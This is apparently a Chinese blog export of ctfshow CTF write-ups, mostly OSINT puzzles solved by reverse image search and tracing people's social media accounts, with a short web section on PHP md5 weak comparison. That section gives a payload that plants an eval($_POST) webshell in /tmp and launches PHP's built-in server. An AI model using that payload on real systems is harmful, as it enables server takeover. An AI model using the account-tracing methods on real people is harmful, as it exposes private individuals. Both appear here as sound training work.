<h2 id="以卵击石"><a href="#以卵击石" class="headerlink" title="以卵击石"></a>以卵击石</h2><p>通过百度识图得到的图片猜测大概是个柠檬的外表<br>直接在b站搜<br>一个一个看<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9F%A0%E6%AA%AC1.png"><br>拿到制作的视频（甜点的售价_内层馅料的种数都在视频中）<br>通过评论区的关键词（请吃饭，蹭饭），翻看“雨哥到处跑”和“力元君”的往期视频，可以发现有一期（蹭饭挑战）提到了这个柠檬<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9F%A0%E6%AA%AC2.png"><br>拿到视频号<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/4Gebi8.md.png"><br>组合一下就好啦</p>
<h2 id="我的朋友"><a href="#我的朋友" class="headerlink" title="我的朋友"></a>我的朋友</h2><p>暴打出题人，啊啊啊啊<br>这一题我前前后后做了4个小时左右，一直组合不对，最后发现顺序错了<br>根据提示，猜测人物为LOL的解说<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%88%91%E7%9A%84%E6%9C%8B%E5%8F%8B1.png"><br>lol解说大部分活跃在微博<br>直接微博搜索<code>英雄联盟主持人</code><br>得到几个人物（余霜，小钰，骆歆）<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%88%91%E7%9A%84%E6%9C%8B%E5%8F%8B2.png"><br>在她们的微博中翻与图片一致的衣服<br>最后在骆歆的微博中找到了时间，战队等信息<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%88%91%E7%9A%84%E6%9C%8B%E5%8F%8B3.png"><br>搜一下赛程表<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%88%91%E7%9A%84%E6%9C%8B%E5%8F%8B4.png"><br>在搜战绩<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%88%91%E7%9A%84%E6%9C%8B%E5%8F%8B5.png"><br>接着是第二场比赛<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%88%91%E7%9A%84%E6%9C%8B%E5%8F%8B6.png"><br>战绩<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%88%91%E7%9A%84%E6%9C%8B%E5%8F%8B7.png"><br>组合在一起</p>
<h2 id="套套去哪儿"><a href="#套套去哪儿" class="headerlink" title="套套去哪儿"></a>套套去哪儿</h2><p>根据提供的信息（2021年6月3号下午和图片中的机型B-6467）<br>在飞常准app中可以查到如下信息<br>西藏航空 TV9817 13:00-15:30 拉萨贡嘎T2-泸州云龙<br>西藏航空 TV9817 13:00-17:55 拉萨贡嘎T2-太原武宿T1<br>西藏航空 TV9817 16:00-17:55 泸州云龙-太原武宿T1</p>
<p>深圳航空 ZH3721 13:00-15:20 拉萨贡嘎T2-泸州云龙<br>深圳航空 ZH3721 13:00-17:55 拉萨贡嘎T2-太原武宿T1<br>深圳航空 ZH3721 16:00-17:55 泸州云龙-太原武宿T1</p>
<p>长龙航空 GJ5039 13:00-15:20 拉萨贡嘎T2-泸州云龙<br>长龙航空 GJ5039 13:00-17:55 拉萨贡嘎T2-太原武宿T1<br>长龙航空 GJ5039 16:00-17:55 泸州云龙-太原武宿T1</p>
<p>接下来就不会了，然后一个一个航班查，一个一个城市试，结果还真蒙对了</p>
<h2 id="见字如面"><a href="#见字如面" class="headerlink" title="见字如面"></a>见字如面</h2><p>赛后做出来的<br>hint1:想想是哪些人收到信呢，信字加粗一下<br>hint2:以写信收藏体育娱乐以及其他明星为主<br>真没有想到在贴吧，学废了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%A7%81%E5%AD%97%E5%A6%82%E9%9D%A21.png"><br>百度识图得到人物名字：山姆<br>在吧内搜索<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%A7%81%E5%AD%97%E5%A6%82%E9%9D%A22.png"><br>在他的其他帖子里找到了qq</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><p>MD5等于自身，如md5($a)&#x3D;&#x3D;$a,php弱比较会把0e开头识别为科学计数法，结果均为0，所以此时需要找到一个MD5加密前后都是0e开头的，如0e215962017<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9C%88%E9%A5%BC%E6%9D%AFweb%E7%AD%BE%E5%88%B01.png"></p>
<h2 id="不要离开我"><a href="#不要离开我" class="headerlink" title="不要离开我"></a>不要离开我</h2><p>在可写的&#x2F;tmp目录下传木马并写系统命令，然后提交5秒内进⾏check，check会关闭nginx和php-fpm，由于是www-data权限，⽆法启动nginx和php-fpm，直接启动php内置服务器即可</p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">cmd=file_put_contents(&quot;/tmp/index.php&quot;,&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);system(&quot;sleep 5 &amp;&amp; php -S 0.0.0.0:80 -t /tmp/&quot;);</span><br></code></pre></td></tr></table></figure>
<p>注意特殊字符编码<br>传入后可以在蚁剑看看有没有成功写入php<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%8D%E8%A6%81%E7%A6%BB%E5%BC%80%E6%88%911.png"><br>flag在根目录<br>（出现<code>Notice: Undefined index: a in /tmp/index.php on line 1</code>是正常情况）<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%8D%E8%A6%81%E7%A6%BB%E5%BC%80%E6%88%912.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】网络迷踪-wp</title>
    <url>/ctfshow/%E3%80%90ctfshow%E3%80%91%E7%BD%91%E7%BB%9C%E8%BF%B7%E8%B8%AA-wp.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>使用到的工具<br>1：<a href="https://graph.baidu.com/pcpage/index?tpl_from=pc">百度识图</a><br>2：<a href="https://images.google.com/?gws_rd=ssl">谷歌识图</a><br>3：<a href="https://www.qvdv.com/tools/qvdv-coordinate.html">经纬度定位</a><br>4：<a href="https://yandex.com/images/">yandex识图</a></p>
<h1 id="新手上路"><a href="#新手上路" class="headerlink" title="新手上路"></a>新手上路</h1><p>格式：ctfshow{桥的名字}<br>求的是桥的名字<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%96%B0%E6%89%8B%E4%B8%8A%E8%B7%AF.jpg"></p>
<p>谷歌识图得到结果为蜈支洲岛<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%9C%88%E6%94%AF%E6%B4%B2%E5%B2%9B.png"></p>
<p>使用百度实景地图查看岛<br>岛屿不是很大，转一圈就看到了<br>ctfshow{情人桥}<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%83%85%E4%BA%BA%E6%A1%A5.png"></p>
<h1 id="初学乍练"><a href="#初学乍练" class="headerlink" title="初学乍练"></a>初学乍练</h1><p>格式：ctfshow{目的地}<br>可以得知是瑞航的飞机<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%88%9D%E5%AD%A6%E4%B9%8D%E7%BB%83.jpg"><br>从wiki百科查看机场<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%91%9E%E5%A3%AB.png"><br>ctfshow{苏黎世}</p>
<h1 id="初学又练"><a href="#初学又练" class="headerlink" title="初学又练"></a>初学又练</h1><p>格式：ctfshow{纬度(精确到小数点后四位, 不用进位),经度(精确到小数点后四位, 不用进位)}<br>可以看到右边店面的名字为：sandwichnsmoothies<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/hRUmbF.png"><br>因为在国外，所以直接用谷歌地图搜，用街景看，发现一模一样<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/hRUIx0.png"><br>真的不想做经纬度的题了，数字太难对了<br>ctfshow{55.6382,12.6411}</p>
<h1 id="初学再练"><a href="#初学再练" class="headerlink" title="初学再练"></a>初学再练</h1><p>格式：ctfshow{军事基地英文}<br>谷歌识图<br>直接得到结果<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%88%9D%E5%AD%A6%E5%86%8D%E7%BB%83.png"><br>ctfshow{Nagurskoye}</p>
<h1 id="现拉现吃"><a href="#现拉现吃" class="headerlink" title="现拉现吃"></a>现拉现吃</h1><p>格式：ctfshow{图中店铺全名的拼音（无分隔符和声调、字母全小写）加食物价格（阿拉伯数字）}<br>百度识图找到一个图案一样的碗<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%8B%89%E9%9D%A2.png"><br>得到结果为“云峰清真餐厅(南滨河路店)”，因为图片上有大众点评的水印<br>所以在大众点评里找，看到评论里有店面的招牌，得到名字为云峰牛肉面<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/hR61TP.png"><br>手机app扫码点单可以得知价格为10，但是提交失败<br>百度得到的价格为17<br>ctfshow{yunfengniuroumian17}</p>
<h1 id="初窥门径"><a href="#初窥门径" class="headerlink" title="初窥门径"></a>初窥门径</h1><p>格式：拍摄者后面的建筑名称，格式ctfshow{建筑名称中文}<br>yandex识图找到类似的图片<br><img src="https://s4.ax1x.com/2021/12/11/oTGyVg.png"></p>
<p>转到一篇游记,提到了城市吉萨<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%88%9D%E7%AA%A5%E9%97%A8%E5%BE%84-2.png"><br>之后也写到了拍摄地点<br>ctfshow{胡夫金字塔}</p>
<h1 id="狗哥去哪"><a href="#狗哥去哪" class="headerlink" title="狗哥去哪"></a>狗哥去哪</h1><p>格式：flag为ctfshow{风景区名字，小写拼音}</p>
<p>图片中有微博id，找到号主，翻看相册，没看到啥信息<br>找到博主的B站号，看到一篇vlog，提到了地点<br><img src="https://s4.ax1x.com/2021/12/11/oTtcIe.png"></p>
<p>ctfshow{daochengyading}</p>
<h1 id="国足加油"><a href="#国足加油" class="headerlink" title="国足加油"></a>国足加油</h1><p>格式：ctfshow{日期+体育场名字}<br>一个gif，使用百度识图搜索<br>在这一篇<a href="https://xw.qq.com/partner/hwbrowser/20200329a041qr/20200329a041qr00?adtag=hwb&pgv_ref=hwb&appid=hwbrowser&ctype=news">新闻</a>中可以得知日期为2016年3月29日,比赛地点为西安<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%9B%BD%E8%B6%B3%E5%8A%A0%E6%B2%B91.png"><br>就差场地了，可以通过关键词来百度搜索<br>得知场地为陕西省体育场<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%9B%BD%E8%B6%B3%E5%8A%A0%E6%B2%B92.png"><br>ctfshow{2016年3月29日陕西省体育场}</p>
<h1 id="致我超吧"><a href="#致我超吧" class="headerlink" title="致我超吧"></a>致我超吧</h1><p>格式：ctfshow{主角ID_vs_对手id}（全小写）<br>百度识图可以找到一篇知乎文章，提到了这是选手<code>innovation</code>的操作<br>另一篇文章提到对手<code>dark</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%87%B4%E6%88%91%E8%B6%85%E5%90%A7.png"><br>ctfshow{innovation_vs_dark}</p>
<h1 id="山外有山"><a href="#山外有山" class="headerlink" title="山外有山"></a>山外有山</h1><p>格式：ctfshow{山的名字}<br>说实话这个图我一眼就看出来了是珠穆朗玛峰<br>但还是识图确认了一下<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%8F%A0%E7%A9%86%E6%9C%97%E7%8E%9B%E5%B3%B0.png"><br>ctfshow{珠穆朗玛峰}</p>
<h1 id="密集恐惧"><a href="#密集恐惧" class="headerlink" title="密集恐惧"></a>密集恐惧</h1><p>格式：提交图片所在地的经纬坐标，就网上公开的就成<br>根据积累与特征直接看出是美国飞机坟场<br>当然百度识图也能出<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%AF%86%E9%9B%86%E6%81%90%E6%83%A7-1.png"><br>ctfshow{32°09’19.17N,110°49’46.69W}</p>
<h1 id="哐啷哐啷"><a href="#哐啷哐啷" class="headerlink" title="哐啷哐啷"></a>哐啷哐啷</h1><p>格式：ctfshow{火车站名称}<br>谷歌识图可以直接找到<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%93%90%E5%95%B7%E5%93%90%E5%95%B71.png"><br>ctfshow{和田}</p>
<h1 id="鲶鱼之谜"><a href="#鲶鱼之谜" class="headerlink" title="鲶鱼之谜"></a>鲶鱼之谜</h1><p>格式：ctfshow{航班号_拍摄时分}，如ctfshow{ab1234_1537}（15时37分拍摄）<br>这题大概是网络迷踪中最难的一题，直接放官网wp了：</p>
<p>part1_航班号：<br>根据照片水印可以找到微博主人，综合8月29号以及之前发的微博可以看出他一直居住在上海，往下翻就能找到这张照片出处，根据评论可以猜测出可能是回天津的航班，根据那条微博的其他照片和发布时间可以推测出航班的起飞时间为18点左右，再通过飞常准app可以查到2021.8.5的航班信息，然后根据飞机的座椅推算出乘坐的航班号为ca1524<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-1.jpg"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-2.jpg"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-3.jpg"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-4.jpg"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-5.jpg"></p>
<p>part2_拍摄时间：<br>通过飞常准app可以找到航班实际起飞时间为18:27以及平均飞行速度为11.68km&#x2F;min，而当天（2021.8.5）山东的日落时间为19:14:39，再结合上海到济南的直线距离816km左右可以得出，飞机到济南需要70min，此时已经日落了，也就是说，此时的飞机还没飞过济南，且位置在上海和济南之间。<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-6.jpg"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-7.jpg"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-8.jpg"></p>
<p>从日落时间19:14开始反推，根据飞机平均速度，在日落前大约能飞549km，以虹桥机场为圆心画一个半径549km的圆，再结合航线判断大概率在江苏上空，再用谷歌地球查看具体时刻的卫星图，可以推算出是在飞机起飞后十分钟之内拍摄的。<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-9.jpg"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-10.jpg"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-11.jpg"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-12.jpg"></p>
<p>从图片可以看出飞机稍微有些倾斜，说明飞机处于爬升阶段，再根据窗外的云层可以判断出此时飞机高度大约为6000米，再用飞常准app查看航线回顾，飞行高度为6000米时飞机位于南通市附近，且处于爬升状态，与之前的推断相吻合，再看具体时刻，大致为18:37，得到flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%B2%B6%E9%B1%BC%E4%B9%8B%E8%B0%9C-13.jpg"></p>
<p>ctfshow{ca1524_1837}</p>
<h1 id="这里有轨"><a href="#这里有轨" class="headerlink" title="这里有轨"></a>这里有轨</h1><p>格式：提交车站名称和车次号，例如：ctfshow{上海T1234}<br>百度搜列车型号相关文章，对比图片得到车型号为<code>CR400BF</code><br><img src="https://s4.ax1x.com/2021/12/12/obrhuD.png"></p>
<p>识图找到站点千岛湖</p>
<p>根据光线等，不可能是早上和晚上，剩下的爆破一下<br><img src="https://s4.ax1x.com/2021/12/12/obcPPA.png"><br>得到：<br>ctfshow{千岛湖G7498}</p>
<h1 id="爆破不了"><a href="#爆破不了" class="headerlink" title="爆破不了"></a>爆破不了</h1><p>格式：ctfshow{拍摄者所处建筑的联系手机号}<br>百度识图得到<code>泉州东西塔</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%88%86%E7%A0%B4%E4%B8%8D%E4%BA%861.png"><br>从照片上看，拍摄者距离景点很近<br>还有图片中房子的走向<br>可以排除镇国塔<br>仁寿塔附近能拍摄的地方不多，基本就锁定了泉州等风民俗<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%88%86%E7%A0%B4%E4%B8%8D%E4%BA%862.png"><br>ctfshow{18050999086}</p>
<h1 id="目之所及"><a href="#目之所及" class="headerlink" title="目之所及"></a>目之所及</h1><p>格式：ctfshow{区号-电话}<br>原图的经纬度没有去掉<br>计算方式<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%BB%8F%E7%BA%AC%E5%BA%A6%E8%AE%A1%E7%AE%97.png"><br>得到大概位置为莆田市<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%8E%86%E7%94%B0.png"><br>通过百度实景地图找到附近的标志性建筑（虽然我感觉不太像，这个角是平的，图里是尖的）<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/h2lGQJ.png"><br>查看附近的景点<br>根据看标志性建筑的角度，加上定位地点，应该是凤凰山公园<br>查看电话号码<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%87%A4%E5%87%B0%E5%B1%B1%E5%85%AC%E5%9B%AD.png"><br>ctfshow{0594-2680716}</p>
<h1 id="窗外风景"><a href="#窗外风景" class="headerlink" title="窗外风景"></a>窗外风景</h1><p>格式：ctfshow{目的城市+比赛地点+下一场比赛城市}</p>
<h1 id="来点福利"><a href="#来点福利" class="headerlink" title="来点福利"></a>来点福利</h1><p>格式：ctfshow{照片中女孩名字_当时住的酒店电话号码}<br>百度识图得到比赛和人物名字<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9D%A5%E7%82%B9%E7%A6%8F%E5%88%A9-1.png"></p>
<p>百度搜比赛地点<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9D%A5%E7%82%B9%E7%A6%8F%E5%88%A9-2.png"></p>
<p>根据右上角招牌搜到电话<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9D%A5%E7%82%B9%E7%A6%8F%E5%88%A9-3.png"></p>
<p>ctfshow{郭敏善_1833-8855}</p>
<h1 id="你的名字"><a href="#你的名字" class="headerlink" title="你的名字"></a>你的名字</h1><p>大佬们都说能直接搜到<br>但我搜了几圈都没找到，不知道是不是姿势不对<br>这里直接借用了大佬的图片<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97111.png"><br>ctfshow{野菜山下商店}</p>
<h1 id="严查外挂"><a href="#严查外挂" class="headerlink" title="严查外挂"></a>严查外挂</h1><p>格式：’ctfshow{‘ + flag +’|’ + link + ‘}’<br>hint1: flag在举报帖子的图片上<br>hint2: 链接地址不是缓存的网页，是直接访问的链接（404），末尾不带’&#x2F;‘<br>百度关键词可以直接搜到那个404的页面<code>https://www.taptap.com/topic/6820231</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%A5%E6%9F%A5%E5%A4%96%E6%8C%821.png"><br>使用谷歌快照查看文章中的图片<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%A5%E6%9F%A5%E5%A4%96%E6%8C%822.png"><br>得到flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%A5%E6%9F%A5%E5%A4%96%E6%8C%823.png"><br>将网址和flag连接起来<br>ctfshow{flag{M1ssInG_T5p1N_P0Wer}|<a href="https://www.taptap.com/topic/6820231%7D">https://www.taptap.com/topic/6820231}</a></p>
<h1 id="附带导航"><a href="#附带导航" class="headerlink" title="附带导航"></a>附带导航</h1><p>。。。<br>在群文件中。（群号：372619038）<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%99%84%E5%B8%A6%E5%AF%BC%E8%88%AA1.png"><br>ctfshow{勇敢炫炫，不怕困难}</p>
<h1 id="给你拷上"><a href="#给你拷上" class="headerlink" title="给你拷上"></a>给你拷上</h1><p>格式：ctfshow{十位纯数字}<br>百度识图找到人物名称<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%BB%99%E4%BD%A0%E6%8B%B7%E4%B8%8A1.png"><br>微博搜索<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%BB%99%E4%BD%A0%E6%8B%B7%E4%B8%8A2.png"><br>ctfshow{1928665723}</p>
<h1 id="菜瞎双眼"><a href="#菜瞎双眼" class="headerlink" title="菜瞎双眼"></a>菜瞎双眼</h1><p>格式：ctfshow{比赛开始日期_比赛名_出题者中文id_原图片文件名_flag{xxxxxx}}<br>这个好难搜<br>翻到第九页才看到<br>得到比赛名<code>红帽杯</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%8F%9C%E7%9E%8E%E5%8F%8C%E7%9C%BC1.png"><br>搜索其他wp文章<br>得到flag<code>flag&#123;d7f1417bfafbf62587e0&#125;</code>和原图片文件名<code>vegetable.png</code><br>在官网找到时间<code>2019-11-10</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%8F%9C%E7%9E%8E%E5%8F%8C%E7%9C%BC2.png"><br>wp中出现了出题人的id：b1cx<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%8F%9C%E7%9E%8E%E5%8F%8C%E7%9C%BC3.png"><br>百度搜索b1cx,第一个github页面找到中文id<code>菠萝吹雪</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%8F%9C%E7%9E%8E%E5%8F%8C%E7%9C%BC4.png"><br>组合在一起<br>ctfshow{2019-11-10_红帽杯_菠萝吹雪_vegetable.png_flag{d7f1417bfafbf62587e0}}</p>
<h1 id="童年回忆"><a href="#童年回忆" class="headerlink" title="童年回忆"></a>童年回忆</h1><p>格式：ctfshow{动画片的名称}<br>看右上角为bilibili独播<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%AB%A5%E5%B9%B4%E5%9B%9E%E5%BF%861.png"><br>看画风是国产的<br>在国产动画中搜索独家，找到一个造型一致的封面<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/4rb3mq.png"><br>ctfshow{美影大乐园}</p>
<h1 id="我在哪呢"><a href="#我在哪呢" class="headerlink" title="我在哪呢"></a>我在哪呢</h1><p>。。图片放大，看到广州，常平，樟木头</p>
<p>ctfshow{东莞站}</p>
<h1 id="耳熟能详"><a href="#耳熟能详" class="headerlink" title="耳熟能详"></a>耳熟能详</h1><p>格式：ctfshow{音频出处}<br>看样子是反转过的，我们利用软件反转回来<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%80%B3%E7%86%9F%E8%83%BD%E8%AF%A61.png"><br>qq识曲<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%80%B3%E7%86%9F%E8%83%BD%E8%AF%A62.png"><br>ctfshow{玫瑰花的葬礼}</p>
<h1 id="传统小吃"><a href="#传统小吃" class="headerlink" title="传统小吃"></a>传统小吃</h1><p>格式：ctfshow{区号-联系电话}<br>老规矩先百度识图<br>找到一张一模一样的<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/4rXhPf.png"><br>图片出自一篇游记<br>找到了地址和店名<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BC%A0%E7%BB%9F%E5%B0%8F%E5%90%832.png"><br>百度地图<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BC%A0%E7%BB%9F%E5%B0%8F%E5%90%833.png"><br>ctfshow{0595-22373358}</p>
<h1 id="宇宙大战"><a href="#宇宙大战" class="headerlink" title="宇宙大战"></a>宇宙大战</h1><p>格式：ctfshow{星系|战斗开始时间}<br>百度识图<br>有很多一模一样的图片，随便点一张<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%AE%87%E5%AE%99%E5%A4%A7%E6%88%981.png"><br>找到日期和地点<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%AE%87%E5%AE%99%E5%A4%A7%E6%88%982.png"><br>ctfshow{2014-03-25|49-U6U}</p>
<h1 id="食堂轶闻"><a href="#食堂轶闻" class="headerlink" title="食堂轶闻"></a>食堂轶闻</h1><p>格式：ctfshow{学校名称_锦旗落款日期}<br>百度关键词搜索<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%A3%9F%E5%A0%82%E8%BD%B6%E9%97%BB1.png"><br>得到学校名字<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%A3%9F%E5%A0%82%E8%BD%B6%E9%97%BB2.png"><br>再次搜索<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%A3%9F%E5%A0%82%E8%BD%B6%E9%97%BB3.png"><br>在贴吧中得到图片，拿到日期<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E9%A3%9F%E5%A0%82%E8%BD%B6%E9%97%BB4.png"><br>ctfshow{南方科技大学_2018_09}</p>
<h1 id="三秦套餐"><a href="#三秦套餐" class="headerlink" title="三秦套餐"></a>三秦套餐</h1><p>格式：ctfshow{所在地广场名称},如ctfshow{天安门广场}<br>根据题目三秦和照片中的老潼关锁定陕西</p>
<p>根据招牌百度得到广场名字<br><img src="https://s4.ax1x.com/2021/12/12/obLw7j.png"></p>
<p>ctfshow{金辉环球广场}</p>
<h1 id="古城豪庭"><a href="#古城豪庭" class="headerlink" title="古城豪庭"></a>古城豪庭</h1><p>格式：ctfshow{隔壁酒店电话}，ctfshow{区号-电话}</p>
<p>缩小一点百度识图<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%8F%A4%E5%9F%8E%E8%B1%AA%E5%BA%AD-1.png"></p>
<p>百度搜西安民乐园文化街附近的酒店<br>得到西安富力希尔顿酒店<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%8F%A4%E5%9F%8E%E8%B1%AA%E5%BA%AD-2.png"></p>
<p>ctfshow{029-87388888}</p>
<h1 id="群欺出狱"><a href="#群欺出狱" class="headerlink" title="群欺出狱"></a>群欺出狱</h1><p>格式：图后面的山的名字和海拔 例如ctfshow{珠穆朗玛峰_635}</p>
<p>直接百度地图可以直接找到位置<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%BE%A4%E6%AC%BA%E5%87%BA%E7%8B%B1-1.png"></p>
<p>附近的几座山百度一下海拔</p>
<p>ctfshow{九华山_741}</p>
<h1 id="Las-Vegas历险记-1"><a href="#Las-Vegas历险记-1" class="headerlink" title="Las Vegas历险记-1"></a>Las Vegas历险记-1</h1><p>谷歌可以搜到原题</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/juanwang-osint-lswjs-1.png"></p>
<p>ctfshow{36.171,-115.139}</p>
<h1 id="Las-Vegas历险记-2"><a href="#Las-Vegas历险记-2" class="headerlink" title="Las Vegas历险记-2"></a>Las Vegas历险记-2</h1><p>一点一点看视频比对就可以找到黄车了</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/juanwang-osint-lswjs-2.png"></p>
<p>ctfshow{TUX&amp;GOWN_36.1575,-115.1483}</p>
<h1 id="Las-Vegas历险记-3"><a href="#Las-Vegas历险记-3" class="headerlink" title="Las Vegas历险记-3"></a>Las Vegas历险记-3</h1><p>先找到车，然后观察周围环境，找到关键建筑（luxor金字塔，mgm酒店）<br>谷歌地图很容易找到路口，但是还要注意时间节点是2017年</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/juanwang-osint-lswjs-3-1.png"></p>
<p>ctfshow{Mandalay_Bay_Rd}</p>
<h1 id="红西秀林"><a href="#红西秀林" class="headerlink" title="红西秀林"></a>红西秀林</h1><p>百度了半天，最后发现原剧中就有</p>
